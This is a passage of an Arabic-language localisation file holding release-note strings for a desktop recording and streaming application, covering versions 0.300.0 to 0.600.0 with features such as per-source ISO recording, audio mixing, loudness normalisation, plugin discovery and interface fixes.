دورة متكررة. كلها مدفوعة بالوقت، لذا يعمل الإعلان من تلقاء نفسه.","changelog.f557861d47ae":"[0.600.0] — 2026-07-16 (تعمّق التسجيل والإعادة — المرحلة 5)","changelog.baab6b442a79":"<em>كل ما يحيط بالملف.</em> تبني المرحلة 5 ما يحدث للتسجيل قبل وصوله إلى القرص وأثناءه وبعده: ملفات معزولة لكل مصدر، وأداة لقصّ المقاطع، وشفافية حقيقية، وتقسيم وعلامات فصول مدفوعة بالأحداث، وخط أنابيب لمهام ما بعد التسجيل، وأداة للتحقق من السلامة، ورمز توقيت SMPTE LTC. كل قدرة جديدة معطَّلة/محايدة افتراضيًا — فالتسجيل الذي لم يُمسّ مطابق بتًا ببت لما كان عليه من قبل — ولا شيء هنا يضيف اتصالًا بالشبكة.","changelog.56eaf8f0fe4b":"<strong>تسجيل ISO لكل مصدر (CAP-N40)</strong> — سجّل المصادر المختارة نظيفةً في ملفات خاصة بها إلى جانب البرنامج، قبل التركيب (مع فلاتر المصدر أو بدونها)، بحجم اللوحة ومعدل إطاراتها كي يستقر كل ملف ISO على الخط الزمني للتحرير متوافقًا مع البرنامج. كل ضيف عن بُعد ما هو إلا مصدر، لذا تأتي ملفات ISO لكل ضيف دون جهد إضافي. حاوية/مُرمِّز خاص لكل مسار؛ ويُلتقط الصوت بعد الفلاتر لكن قبل الـ fader/الكتم (فقرار المزج لا يُسكت ملف ISO أبدًا)؛ وزر الطوارئ يجمّد مسارات ISO أيضًا. معطَّل حتى تُختار المصادر؛ مع إرشادات صادقة مسبقة حول تكلفة كل مسار.","changelog.070729b0bdcf":"<strong>أداة قصّ الإعادات والمقاطع (CAP-N41)</strong> — نافذة قصّ خفيفة لأي تسجيل محفوظ بحاوية قياسية: نقاط بداية/نهاية بخطوة إطار واحد مع معاينة مباشرة، وشارة تصدير صادقة تبيّن مسبقًا ما إذا كان المقطع سيُصدَّر <strong>بنسخ التدفق</strong> (نقطة بداية متوافقة مع إطار مفتاحي — شبه فوري، بلا فقدان) أو بإعادة الترميز. نقرة واحدة تعيد تأطيره إلى نسخة رأسية أصلية بنسبة 9:16 عبر هندسة اللوحة الرأسية.","changelog.a785df0dd1f8":"<strong>التسجيل بقناة ألفا (CAP-N42)</strong> — سجّل البرنامج بشفافية حقيقية إلى صيغة <code>.frec</code> الخاصة بالتطبيق (علم جديد في الترويسة؛ إصدار الصيغة بلا تغيير، لذا تبقى ملفات ألفا قابلة للتشغيل في كل مكان، وتُقرأ الملفات القديمة معتمة). يحصل المُسجِّل على عرض خاص به بخلفية شفافة، لذا تحتفظ المعاينة والبث بالبرنامج المعتم العادي. صدّر إلى نسخة أصلية <code>.mov</code> بترميز <strong>ProRes 4444</strong> أو <strong>QuickTime Animation (QTRLE)</strong> لبرامج التحرير غير الخطي (NLE) عبر مكوّن ffmpeg المُعلَّم.","changelog.79e72558f2ad":"<strong>التقسيم عند تغيير المشهد / العلامة (CAP-N43)</strong> — مُشغِّلات أحداث جديدة لأداة تقسيم <code>.frec</code> الخاصة بالتطبيق: ابدأ ملف جزء جديدًا عند تبديل المشهد، أو عند وضع علامة فصل، أو عند خطوة في جدول سير العرض. يبدأ كل جزء تمامًا عند حد إطار الحدث (مع حد أدنى لطول الجزء قدره ثانية واحدة كي لا تُنتج عاصفة أحداث ملفات متناثرة كقصاصات الورق). تُقسَّم الحاويات القياسية بحسب الوقت فقط، وهذا مذكور بوضوح في الإعدادات.","changelog.ef021f62a151":"<strong>علامات تلقائية من الأحداث (CAP-N44)</strong> — علامات فصول تُوضع تلقائيًا بفعل أحداث الاستوديو — تبديلات المشاهد، وحفظ الإعادات، وإعادة اتصال البث، ودفعات الإطارات المُسقَطة، وإطلاق التنبيهات، وإجراءات محرك القواعد — لكلٍّ منها تسمية مصنَّفة حسب النوع، إلى جانب اختصار العلامة اليدوية الموجود. تنتقل التسميات إلى عناوين فصول mkv وإلى الملف المرافق <code>.chapters.txt</code>.","changelog.5e520f7a947e":"<strong>خط أنابيب ما بعد التسجيل (CAP-N45)</strong> — سلسلة مهام لما بعد التسجيل لكل ملف تعريف، من مجموعة إجراءات <strong>مغلقة ومعزولة</strong>: تحقّق ← إعادة تغليف إلى MP4 ← معايرة الصوت ← تطبيق قاعدة تسمية ← نقل/نسخ إلى مجلد ← إظهار في مدير الملفات ← إخطار سكربتات Lua. تعمل في الخلفية مع عرض مباشر لقائمة الانتظار؛ وتتوقف السلسلة عند أول فشل. لا توجد عمدًا خطوة «تشغيل أمر».","changelog.792a44452b11":"<strong>أداة التحقق من سلامة التسجيل (CAP-N46)</strong> — فحص محلي سريع (بعد الإنهاء أو عند الطلب) يتحقق من بنية الحاوية، وتذييل الإنهاء، واستمرارية إطارات الفيديو، واستمرارية عينات الصوت لكل مسار، وانحراف تشابك الصوت/الفيديو، والمدة مقارنةً بالوقت الفعلي لدى المُسجِّل، ويُنتج تقريرًا بلغة واضحة: سليم / تحذير / فشل. تحظى صيغة <code>.frec</code> الخاصة بالتطبيق بفحص معمّق؛ أما الملفات القياسية فتخضع لفحص صادق للبنية + أخطاء فك الترميز عبر ffmpeg.","changelog.42ea336f6972":"<strong>مصدر رمز التوقيت LTC وقارئه (CAP-N47)</strong> — مولّد وقارئ خاصان بالتطبيق لرمز التوقيت الخطي SMPTE 12M (رمز توقيت صوتي كلاسيكي، دون اتصال بالكامل). ولّد LTC على مسار مازج قابل للتعيين (سجّله أو وجّهه إلى معدات خارجية)؛ واقرأ LTC الوارد من أي مدخل صوتي لتشغيل سطر رمز توقيت مطبوع على الصورة في تراكب إحصاءات النظام، وعلامات فصول مختومة بـ LTC. دقة الذهاب والإياب ±1 إطار عند 24/25/30 fps.","changelog.157723e79681":"<strong>لم يعد تضمين الفصول يتراجع عند تشغيل تسجيل رأسي.</strong> أصبح فحص تضمين فصول mkv ينظر إلى ملف التسجيل الرئيسي وحده، لذا لم يعد ملف رأسي (أو ISO) موازٍ يدفع تسجيل mkv أحادي الملف إلى مسار الملف المرافق.","changelog.8d45b8a98d91":"[0.500.0] — 2026-07-15 (تعمّق الإنتاج الصوتي — المرحلة 4)","changelog.b7c13c220405":"<em>من المازج إلى منصة التحكم.</em> تحوّل المرحلة 4 المازج المشحون إلى منصة بث: توجيه إلى مخرجات فعلية ومزجات مساعدة/إشارة (aux/cue)، ومصفوفة خفض تلقائي N×M، ومازج تلقائي بتقاسم الكسب، ومعايرة جهارة الصوت وفق EBU R128 (ضابط مباشر + معالجة بعد التسجيل)، ومُعادِل بارامتري مع طيف مباشر، ومزيل الصفير وحاجز الهدير، ولوحة أصوات، وتسجيل صوتي فقط (بودكاست)، وmix-minus لكل ضيف مع إعدادات مسبقة لسلاسل الصوت بنقرة واحدة، والاكتشاف والأساس النظيف المرخَّص بـ MIT لاستضافة إضافات CLAP <strong>وVST3</strong>. كل شيء معالجة إشارات رقمية (DSP) كلاسيكية خاصة بالتطبيق — دون تعلّم آلي، وفقًا للميثاق — ويُشحن معطَّلًا/محايدًا افتراضيًا، لذا فإن المزيج الذي لم يُمسّ مطابق بتًا ببت لما كان عليه من قبل.","changelog.5159ad1b9251":"<strong>النواقل المساعدة والتوجيه إلى المخرجات الفعلية (CAP-N30)</strong> — وجّه المزيج الرئيسي أو أيًّا من نواقل المسارات الستة إلى أجهزة إخراج فعلية إضافية، لكلٍّ منها ضبط مستوى، من مصفوفة <strong>التوجيه</strong> (زر التوجيه في مازج الصوت). ناقل المسار المرسل إلى سماعات الرأس هو مزيج إشارة (cue) يختلف عن المراقبة. الافتراضي هو السلوك الحالي نفسه تمامًا (ناقل المراقبة وحده يصل إلى جهاز).","changelog.d41c3c08bea2":"<strong>مصفوفة الخفض التلقائي بالسلسلة الجانبية (CAP-N31)</strong> — شبكة <strong>الخفض التلقائي</strong> موحّدة تحدد من يخفض صوت من: يمكن لأي مصدر أن يخفض أي مجموعة، ولكل زوج عمقه وعتبته وزمن الهجوم والتحرير الخاص به. يكدّس المحرك عدة مُخفِّضات لكل شريط، لذا يمكن خفض شريط واحد بعدة مُشغِّلات في آن واحد.","changelog.b732fddcfca9":"<strong>مازج تلقائي بتقاسم الكسب (CAP-N32)</strong> — مفتاح <strong>مزج تلقائي</strong> على طريقة Dugan لكل شريط: عبر جميع الميكروفونات الخاضعة للمزج التلقائي يُبقى الكسب الإجمالي ثابتًا تقريبًا ويُمنح لمن يتحدث (وفق قانون حتمي يكون فيه مجموع الكسب واحدًا)، وهو مثالي للحلقات النقاشية متعددة المقدمين والبودكاست. معطَّل افتراضيًا.","changelog.ca003a06d04f":"<strong>معايرة جهارة الصوت وفق EBU R128 (CAP-N34)</strong> — يوجّه <strong>ضابط الجهارة</strong> المباشر البرنامج نحو هدف (−14 / −16 / −23 LUFS) مع سقف للذروة، ويُطبَّق على المزيج الرئيسي وكل ناقل مسار لتصل التسجيلات والبث إلى مستوى ثابت؛ إضافةً إلى إجراء <strong>تطبيع</strong> بعد التسجيل في قائمة التسجيلات (<code>loudnorm</code> في ffmpeg). معطَّل افتراضيًا.","changelog.01407091e030":"<strong>مُعادِل بارامتري + عرض الطيف (CAP-N35)</strong> — مُعادِل بارامتري بعدد N من النطاقات (جرسي / رفّ منخفض / رفّ مرتفع / نوتش / تمرير عالٍ / تمرير منخفض) مع <strong>عُقد قابلة للسحب فوق محلّل طيف مباشر</strong>؛ والمنحنى هو رياضيات RBJ ذاتها التي يشغّلها المحرك. تحويل FFT خاص بالتطبيق؛ ولا يعمل المحلّل لكل شريط إلا أثناء فتح المحرر.","changelog.42a294780d05":"<strong>مزيل الصفير + حاجز الهدير (CAP-N36)</strong> — <strong>مزيل صفير</strong> بنطاق مقسوم (كاشف للأصوات الصفيرية يتحكم في قطع رفّ مرتفع ديناميكي، صحيح الطور، دون تعلّم آلي) و<strong>حاجز هدير</strong> نظيف لقطع الترددات المنخفضة من الرتبة الثانية لضربات المكتب والأصوات الانفجارية — وكلاهما فلتر صوتي عادي.","changelog.29e99512428d":"<strong>لوحة الأصوات (CAP-N37)</strong> — شبكة وسائد لمقاطع صوتية محلية مع كسب لكل وسادة، ومجموعات إيقاف (choke) (الوسادة الجديدة توقف الأخيرة في مجموعتها)، وتكرار، واختصار، وتعيين مسار، وخفض تلقائي اختياري لبقية المزيج أثناء تشغيل الوسادة. يُفك ترميز الوسائد عبر مكوّن ffmpeg المُعلَّم إلى المازج مثل أي مصدر.","changelog.251ef95cea94":"<strong>التسجيل الصوتي فقط (CAP-N38)</strong> — <strong>وضع بودكاست</strong> يسجّل ملفات <strong>WAV</strong> لكل مسار عبر الكاتب الخاص بالتطبيق (دون تشغيل أي مُرمِّز فيديو على الإطلاق)، مع إمكانية التحويل إلى <strong>FLAC/Opus</strong> عبر مكوّن ffmpeg المُعلَّم، مع كتابة علامات تخطي الصمت في ملف مرافق، وقوالب أسماء الملفات CAP-M25. من مربع حوار التسجيلات.","changelog.d0ae0d751fe2":"<strong>Mix-minus لكل ضيف وإعدادات مسبقة لسلاسل الصوت (CAP-N39)</strong> — <strong>إعدادات مسبقة لسلاسل الصوت</strong> بنقرة واحدة (سلاسل بث / بودكاست / نظيفة: بوابة ← ضاغط ← مُعادِل ← مُحدِّد) تُطبَّق على أي شريط، ومرتجع <strong>Mix-minus (N−1)</strong> خاص بالتطبيق لكل مصدر (كل من في البرنامج باستثناء ذلك المصدر) كي لا يسمع الضيف عن بُعد أي صدى.","changelog.d1c450a7bdfb":"<strong>الإضافات الصوتية — اكتشاف CLAP + VST3 (CAP-N33)</strong> — لوحة <strong>الإضافات</strong> التي تعثر على إضافات <strong>CLAP وVST3</strong> المثبتة لديك في المجلدات القياسية (اختيارية، في المجلدات المحلية فقط، دون جلب أي شيء). كلا التنسيقين مرخّص بـ MIT، ونظيف بتكلفة $0؛ وتشغّل الاستضافة المباشرة كل إضافة في عملية معزولة عن الانهيارات مع واجهتها الرسومية الخاصة — وتكامل عملية الاستضافة هذا قيد التنفيذ، واللوحة تذكر الخطة بوضوح بدلًا من تزييف مفتاح تبديل.","changelog.1002a64a6813":"<strong>مُصوِّرات مباشرة للفلاتر (واجهة عرض الإضافات)</strong> — أصبح كل فلتر صوتي أداة مرئية أثناء فتح محرره: <strong>منحنى نقل</strong> لمعالجات الديناميكية (الضاغط / المُحدِّد / البوابة) مع الإشارة المباشرة تسير على المنحنى، أو <strong>منحنى استجابة ترددية</strong> لفلاتر النغمة (المُعادِل / مزيل الصفير / حاجز الهدير)، أو قراءة للمستوى لبقية الفلاتر — كلٌّ منها بجوار <strong>مقاييس الدخل / الخرج / خفض الكسب</strong> التي تتحرك مع الصوت، بالمظهر الأنيق نفسه للمحلّل الداكن المستخدم في المُعادِل البارامتري.","changelog.5fbac10a716a":"<strong>اختصار على سطح المكتب عند التثبيت على Windows</strong> — أصبح MSI ينشئ اختصارًا لـ <strong>Freally Capture</strong> على سطح المكتب (يُزال عند إلغاء التثبيت).","changelog.2a6141e43be0":"تغيّر","changelog.015b6bb3a57b":"<strong>أصبح VST3 مرخّصًا بـ MIT.</strong> أعادت Steinberg ترخيص VST 3.8 SDK بموجب MIT في <strong>2025-10-29</strong>، لذا صُحّحت الملاحظة السابقة «VST3 مرخّص بـ GPLv3 أو بترخيص احتكاري، وهو غير متوافق» في <code>vst.rs</code> و<code>claphost.rs</code> و<code>THIRD-PARTY-NOTICES.md</code> — وأصبح VST3 الآن مسارًا للإضافات نظيفًا بتكلفة $0 على قدم المساواة مع CLAP.","changelog.eaa014cf0965":"[0.400.0] — 2026-07-15 (تعمّق المُركِّب والمؤثرات — اكتمال المرحلة 3)","changelog.c2a0fb6beabd":"يُنجز النصف الثاني من المرحلة 3 ميزات الحركة والمؤثرات الخمس المؤجلة، فتكتمل المرحلة: <strong>انتقال النقل (التحوّل)</strong>، و<strong>قواعد الانتقال</strong>، و<strong>استوديو المظللات</strong> لمؤثرات WGSL الخاصة بالمستخدم، ومحرر <strong>قناع بيزيه</strong>، و<strong>فواصل انتقالية (stingers) بقناع المسار</strong> مع خفض اختياري لصوت البرنامج. إضافةً إلى إصلاح رابطين في قائمة المساعدة لم يكونا يفعلان شيئًا.","changelog.9b85d048fa23":"<strong>انتقال النقل (التحوّل) (CAP-N20)</strong> — نوع انتقال جديد: العناصر التي تظهر في المشهد الخارج والداخل <em>كليهما</em> (المصدر نفسه) تتحرك من موضعها/مقياسها/دورانها/اقتصاصها القديم إلى الجديد بدلًا من القطع؛ أما العناصر الموجودة في مشهد واحد فقط فتظهر أو تختفي تدريجيًا. مع تخفيف بدالة smootherstep كي تتسارع الحركة في البداية وتستقر في النهاية.","changelog.ccf72b961a2f":"<strong>قواعد الانتقال (CAP-N21)</strong> — مصفوفة انتقالات لكل زوج من المشاهد (<strong>أدوات ← قواعد الانتقال</strong>): يمكن للانتقال من المشهد A إلى B أن يستخدم نوعه ومدته الخاصين بدلًا من الافتراضي. إضافةً إلى <strong>ظهور تدريجي عند الإظهار/الإخفاء</strong> لكل عنصر (تعديل التحويل ← الكشف): يظهر العنصر تدريجيًا عند جعله مرئيًا. أصبحت جميع انتقالات المزج والنقل مخففة الآن.","changelog.cd2edf9cde0e":"<strong>استوديو المظللات (CAP-N22)</strong> — اكتب <strong>مؤثر WGSL خاصًا بك</strong> كفلتر: يُترجم ويُتحقق منه وقت التشغيل (يُتجاهل المظلل غير الصالح — فيُعرض المصدر دون فلترة، ولا يحدث انهيار أبدًا)، مع منزلقات تُولَّد تلقائيًا من تعليقات <code>// @param</code>، وتحرير مباشر، ومعرض مدمج (تدرّج رمادي، عكس الألوان، خطوط المسح، تعتيم الأطراف).","changelog.51dd65cc8ab0":"<strong>قناع بيزيه (CAP-N28)</strong> — فلتر <strong>قناع حر</strong>: ارسم مسارًا مغلقًا (اسحب المقابض، وانقر نقرًا مزدوجًا للإضافة، وانقر بزر الماوس الأيمن للإزالة)، مع أشكال مسبقة، وتنعيم لكل حافة، وعكس. صدّر أي مسار كنمط <strong>مسح بالإضاءة (luma-wipe)</strong> بتدرّج رمادي لانتقال يكشف عن شكل.","changelog.1e693f57a778":"<strong>فواصل انتقالية بقناع المسار (CAP-N29)</strong> — يمكن للفاصل الانتقالي (stinger) أن يحمل شفافيته على شكل <strong>قناع المسار</strong> (التعبئة والقناع مرصوصان <strong>جنبًا إلى جنب</strong> أو بشكل <strong>مكدّس</strong>)، لذا تصمد قناة ألفا لكل بكسل أمام برامج الترميز التي تُسقطها (H.264/HEVC). اختياريًا، <strong>اخفض صوت البرنامج</strong> تحت صوت الفاصل نفسه أثناء تشغيله.","changelog.646680d87464":"<strong>العنصران مساعدة ← زيارة الموقع الإلكتروني وبوابة المساعدة لم يكونا يفعلان شيئًا.</strong> كانت روابط القائمة هذه (والروابط نفسها في مربع حوار «حول») تعتمد على أن يفتح عرض الويب <code>target=&quot;_blank&quot;</code>، وهو ما لا يفعله بناء Tauri هذا أبدًا. أصبحت الآن تفتح متصفح نظام التشغيل عبر أداة الفتح المعتمدة في التطبيق — <strong>زيارة الموقع الإلكتروني</strong> ← الصفحة الرئيسية، و<strong>بوابة المساعدة</strong> ← صفحة التوثيق.","changelog.e322c5f672ae":"[0.310.0] — 2026-07-14 (تعمّق المُركِّب والمؤثرات — المرحلة 3، الجزء 1)","changelog.2d984c4daa81":"النصف الأول من المرحلة 3 (تعمّق المُركِّب والمؤثرات): تصل الحركة والمؤثرات إلى اللوحة — أنماط تمويه جديدة، وإمالة ثلاثية الأبعاد، وتجميد الإطار، واستنساخ المصادر بنقرة واحدة، و<strong>مفاتيح الإخراج النهائي</strong> على طراز البث التي تعلو كل مشهد. إضافةً إلى الإصلاحات الثلاثة المُبلَّغ عنها في 0.301.0 — ومنها خلل في جهاز العرض قد يجمّد سطح المكتب بأكمله.","changelog.dbef37c22c9b":"<strong>عائلة التمويه (CAP-N27)</strong> — أربعة فلاتر GPU جديدة إلى جانب التمويه الغاوسي: <strong>اتجاهي</strong> (أثر حركة على امتداد زاوية)، و<strong>شعاعي</strong> (دوران حول مركز)، و<strong>التقريب</strong> (أثر تقريب على طريقة dolly-zoom)، و<strong>تحويل إلى بكسل</strong> (فسيفساء). كلٌّ منها مرور واحد مُخطَّط مع اختبارات الإطار المرجعي.","changelog.1647ee3fae6b":"<strong>التحويل ثلاثي الأبعاد / المنظوري (CAP-N23)</strong> — يمكن إمالة العنصر في ثلاثة أبعاد: <strong>إمالة X</strong>، و<strong>إمالة Y</strong>، وقوة <strong>المنظور</strong> في تعديل التحويل. يُعرض التحويل العادي (غير المائل) مطابقًا بكسلًا ببكسل — ولا تُستخدم المصفوفة الإسقاطية إلا عند تطبيق إمالة.","changelog.ebaba11b62a2":"<strong>فلتر تجميد الإطار (CAP-N25)</strong> — أضف فلتر <strong>تجميد</strong> إلى مصدر فيثبت على آخر إطار له؛ ويتجمد البرنامج والمعاينة والتسجيل والبث معًا. بدّل حالته لإلغاء التجميد.","changelog.e1ac0ba4a7ba":"<strong>استنساخ المصدر (CAP-N26)</strong> — زر <strong>استنساخ</strong> في كل صف مصدر (⧉): تغذية واحدة، ومظاهر متعددة. يمكن للمصدر نفسه أن يوجد في عدة مشاهد/مواضع، ولكل عنصر تحويله ومجموعة فلاتره الخاصة (كان المحرك يربط الفلاتر بكل عنصر أصلًا؛ وهذا يجعل الأمر بنقرة واحدة).","changelog.d223f64ff4d4":"<strong>مفاتيح الإخراج النهائي (CAP-N24)</strong> — طبقات تراكب دائمة تُدمج في <strong>مخرج البرنامج</strong>، فوق كل مشهد، وتصمد أمام قطع المشاهد (شعار المحطة، أو شارة «مباشر»، أو شريط سفلي). تديرها لوحة جديدة <strong>أدوات ← مفاتيح الإخراج النهائي</strong>: أضف أي مصدر، وأعد الترتيب، واضبط العتامة والموضع/الحجم، والتشغيل/الإيقاف لكل طبقة. تُعرض في المعاينة والتسجيل والبث والعرض المتعدد على حد سواء.","changelog.c53ca5aa04c7":"أصبح <strong>ما الجديد</strong> يفتح سجل التغييرات للبناء العامل <strong>داخل التطبيق</strong> (عرض الملاحظات نفسه للقراءة فقط الذي يستخدمه المُحدِّث) بدلًا من علامة تبويب في المتصفح — دون اتصال، ودائمًا الملاحظات التي شُحنت فعلًا.","changelog.a41f1b775b16":"<strong>عرض مساحة القرص في لوحة الإحصاءات</strong> — مربع <strong>القرص</strong> المباشر يعرض المساحة الحرة على محرك التسجيل، وأثناء التسجيل يقدّر مربع <strong>المتبقي للتسجيل</strong> الوقت المتبقي حتى يمتلئ المحرك بمعدل الكتابة الحالي (التقدير الصادق نفسه المراعي لصيغة <code>.frec</code> الذي يستخدمه تحذير انخفاض مساحة القرص). لتعرف كم تبقى من مساحة أثناء التسجيل أو البث.","changelog.266a45108853":"<strong>كان «فتح جهاز العرض» يجمّد سطح المكتب بأكمله.</strong> كان فتح جهاز عرض على شاشة يطلب من نظام التشغيل ملء الشاشة الحصري <em>أثناء إنشاء النافذة</em> على الشاشة الرئيسية، مما يُحدث جمودًا تامًا (deadlock) في حلقة أحداث Windows — فيتجمد سطح المكتب ويتعين إنهاء التطبيق من إدارة المهام. أصبحت أجهزة العرض الآن <strong>نافذة بلا حدود بحجم الشاشة المختارة</strong> (وهذا ما يكونه «جهاز العرض بملء الشاشة» في OBS فعلًا): دون تبديل وضع DWM، ويظل Esc / Alt+F4 / شريط المهام تعمل كلها.","changelog.5f6fa8c04556":"<strong>لم يكن استيراد مشاهد OBS يختار الكاميرا.</strong> كان جهاز التقاط الفيديو المستورد من OBS يستقر على «(الجهاز الحالي)» دون تحديد أي شيء — إذ كانت أداة الاستيراد تُسقط جهاز OBS بالكامل. أصبحت الآن تنقل الاسم المألوف للجهاز في OBS وتربطه بكاميرا هذا الجهاز عند الاستيراد.","changelog.7dca8f4d0d7f":"[0.301.0] — 2026-07-14 (شريط القوائم ونافذة الإعدادات)","changelog.080821dda5da":"إطار تطبيق سطح مكتب، على شاكلة OBS لكنه خاص بـ Freally: <strong>شريط قوائم</strong> حقيقي في الأعلى و<strong>نافذة إعدادات بشريط جانبي</strong> مع موافق / إلغاء / تطبيق — لتعود لوحة عناصر التحكم إلى كونها عناصر تحكم مباشرة بدلًا من جدار من أزرار التشغيل.","changelog.8a7238deca0a":"<strong>شريط قوائم التطبيق</strong> — ملف · تحرير · عرض · الأرصفة · ملف التعريف · مجموعة المشاهد · أدوات · مساعدة، في أعلى النافذة. وهو مجرد طبقة توجيه فوق إجراءات كانت موجودة أصلًا (إجراءات لوحة الأوامر)، لذا لا يحدث شيء جديد في الخلفية — كل ما في الأمر أن أزرار التشغيل صار لها موطن. يصل ملف إلى إظهار التسجيلات / إعادة التغليف / الإعدادات / إظهار مجلد الإعدادات / خروج؛ ويضم تحرير التراجع والإعادة ونسخ/لصق التحويل والفلاتر؛ وتجمع أدوات الأتمتة، وجدول البرنامج، وخريطة الاختصارات، ومزامنة الصوت/الفيديو، والسكربتات، والمكوّنات، وMIDI، وPTZ، وواجهة API البعيدة، ولوحة الشبكة المحلية؛ ويبدّل ملف التعريف ومجموعة المشاهد بين المجموعات المحفوظة؛ وتفتح مساعدة التوثيق، وسجل التغييرات، وتقرير الأخطاء، والتحقق من التحديثات. يمكن التنقل في القوائم المنسدلة بلوحة المفاتيح (مفاتيح الأسهم بين القوائم وداخلها) وهي موسومة لقارئات الشاشة؛ والعناصر الخاصة بميزات غير موجودة بعد حاضرة لكنها معطَّلة.","changelog.0a8800013b15":"<strong>نافذة إعدادات على طراز OBS</strong> — شريط جانبي أيسر للفئات (<strong>عام · المظهر · البث · الخرج · الإعادة · الاختصارات · الشبكة · إمكانية الوصول · حول</strong>) مع جزء مُجمَّع قابل للتمرير وتذييل <strong>موافق / إلغاء / تطبيق</strong>. <strong>لا يتغير شيء حتى تنقر تطبيق (أو موافق):</strong> تعدّل النافذة نسخة خاصة، ويبقى تطبيق باهتًا حتى تغيّر شيئًا فعلًا، ويعيد إلغاء/Escape ما كان لديك تمامًا — تُعاين السمة ولون التمييز مباشرةً أثناء فتح النافذة لكنهما يعودان عند الإلغاء دون أن يتركا أثرًا. يظهر الخطأ الخاص بكل فئة ضمن السطر مع نقطة على مدخلها في الشريط الجانبي.","changelog.0b27c918454f":"<strong>ربط اختصارات خالٍ من التعارض</strong> — تربط فئة الاختصارات كل إجراء من <strong>قائمة منسدلة لاختصارات منتقاة</strong>، لا من مربع نص. اختيار اختصار لإجراء ما يزيله من قائمة كل إجراء آخر، لذا لا يمكن أبدًا لميزتين أن تحملا المفتاح نفسه؛ ويؤدي <strong>بلا</strong> إلى إلغاء الربط وإعادة الاختصار إلى المجموعة المتاحة. يضيّق مربع تصفية القائمة. أُزيل الإدخال الحر للنص بالكامل، وأصبحت الواجهة الخلفية ترفض المسرّعات المشوّهة بنيويًا، لذا لا يمكن حفظ ربط عبثي حتى بالتحرير اليدوي.","changelog.757f7265a0b3":"<strong>إمكانية الوصول: ألوان مقاييس المازج</strong> — تضبط فئة إمكانية الوصول الجديدة ألوان نطاقات مقاييس VU، مع <strong>إعداد مسبق آمن لمصابي عمى الألوان</strong> (Okabe-Ito) إلى جانب الافتراضي وخيار مخصص.","changelog.bc44a26e0073":"<strong>مجلدات الاختصار على سطح المكتب</strong> — يفتح ملف ← إظهار التسجيلات / إظهار مجلد الإعدادات مجلدات التطبيق نفسه في مستعرض الملفات (عبر أمر خاص بالتطبيق، لا عبر مسار خام من عرض الويب أبدًا).","changelog.a8559338a320":"<strong>أصبحت لوحة عناصر التحكم مقتصرة على عناصر التحكم.</strong> انتقلت جميع أزرار تشغيل مربعات الحوار الـ18 (الإعدادات، والخرج، والبث، والأرصفة، وملفات التعريف، والسكربتات، والأتمتة، والإبلاغ عن خطأ، والتحقق من التحديثات، …) إلى شريط القوائم؛ ولا تحتفظ اللوحة إلا بما يقود البث — بدء/إيقاف التسجيل، وبدء البث، وتجهيز الإعادة، وزر الطوارئ، ووضع الاستوديو، والانتقالات. ولا تزال مطالبات تقرير الانهيار وتوفر التحديث تظهر عند التشغيل تمامًا كما كانت.","changelog.2ce026bd331e":"[0.300.1] — 2026-07-14 (جولة التبسيط للمرحلة 2)","changelog.82f024d54659":"لا ميزات جديدة: مراجعة تنظيف من أربع زوايا (إعادة الاستخدام / التبسيط / الكفاءة / مستوى التجريد) لمجموعة تغييرات 0.300.0، مع تطبيق نتائجها. ورافقها إصلاح واحد ظاهر: كان <strong>مُركِّب واجهة تراكب الإدخال</strong> لا يزال يستخدم مزج ألفا السابق للإصلاح، فكانت حواف الرموز المرسومة فوق الشفافية تظهر داكنة قليلًا — وأصبح الآن يتشارك <code>compose::blit</code> المُصحَّحة مع كل مصادر الواجهات الأخرى.","changelog.5d482d56004f":"<strong>مشاركة ما بناه 0.300.0 ثم تجاوزه.</strong> أصبحت عمليات نسخ ألفا الأربع المكتوبة يدويًا تستدعي مُركِّبًا واحدًا؛ وأصبح تقييد البحث، وفك ترميز عينات الصوت، ومراقب العمليات الفرعية موجودة مرة واحدة في <code>media.rs</code> (وتعتمدها الوسائط وقائمة التشغيل والإعادة واستقبال الشبكة المحلية جميعها)؛ وأصبحت سجلات الجلسات الضعيفة الأربعة <code>WeakRegistry</code> واحدًا؛ وأصبحت قواعد <code>{{variable}}</code> دالة واحدة فقط تتشاركها العناوين ومحرك الأتمتة (فلم يعد بإمكانهما التباعد)؛ وأصبح نموذج استقبال الشبكة المحلية، ومُصيِّر رموز QR، والقيم الافتراضية لطبقات العناوين، وجداول الخيارات وحدات واجهة مستخدم مشتركة مفردة؛ وأصبح فحص عنوان IP في الشبكة المحلية، ومُرمِّز JPEG في مُرسِل Link، والخلط العشوائي في قائمة التشغيل تستدعي جميعها الدوال المساعدة الموجودة أصلًا بدلًا من حمل نسخ منها.","changelog.9f9c71653770":"<strong>نظافة الزمن الحقيقي.</strong> لم تعد نقطة التقاط المُصوِّر في المازج تخصّص ذاكرة لكل كتلة مدتها 10 ms؛ وأصبح مُرسِل Freally Link يكتب الإطارات بالترويسة ثم الحمولة بدلًا من نسخ كل إطار برنامج بصيغة JPEG إلى مخزن مؤقت وسيط؛ وأصبح مؤقّت التقسيمات يحسب عمود المقارنة مرة واحدة لكل جلسة بدلًا من كل إعادة رسم؛ وتوقف فحص حالة استقبال الشبكة المحلية عن إعادة تحويل معرّف المصدر إلى سلسلة نصية مع كل إطار مُستنزَف.","changelog.b393d51bd0f8":"أُزيلت أجزاء ميتة متنوعة (حقل ذراع تحكم لا يُقرأ، واشتقاقات derive غير مستخدمة، ودوال مساعدة عامة أكثر من اللازم)، وأُزيل تكرار مقدمات وسائط ffmpeg وعمليات الفحص داخل وحدة فك الترميز — أوامر مطابقة بايتًا ببايت، مكتوبة مرة واحدة.","changelog.b1d50dd41d90":"<strong>أصبح مُثبِّت Windows ينشئ اختصارًا على سطح المكتب.</strong> لا ينشئ قالب NSIS في Tauri سوى مدخل في قائمة ابدأ ولا يوفر خيارًا لاختصار سطح المكتب، لذا لم يضع أي تثبيت أيقونة على سطح المكتب قط — أصبحت خطافات المُثبِّت الآن تنشئ <code>Freally Capture.lnk</code> (بأيقونة التطبيق نفسه) عند كل تثبيت وتزيله عند إلغاء التثبيت.","changelog.45faf29e220b":"<strong>أصبح بالإمكان إزالة أدلة المحاذاة بنقرة واحدة.</strong> كانت إزالة الدليل تعني سحب خط بعرض بكسل واحد خارج اللوحة — عمل دقيق يؤدي فيه الخطأ إلى بدء سحب عنصر بدلًا من ذلك (فتبدو خطوط الالتقاط الأرجوانية عندها وكأن «دليلًا جديدًا ظهر»، وهو بلاغ فعلي من الاستخدام). يكتسب شريط أدوات الأدلة زر <strong>إزالة كل الأدلة</strong>، وأصبحت منطقة الإمساك حول كل دليل أعرض.","changelog.cb705b484db4":"[0.300.0] — 2026-07-14 (مصادر وتراكبات جديدة — المرحلة 2 من 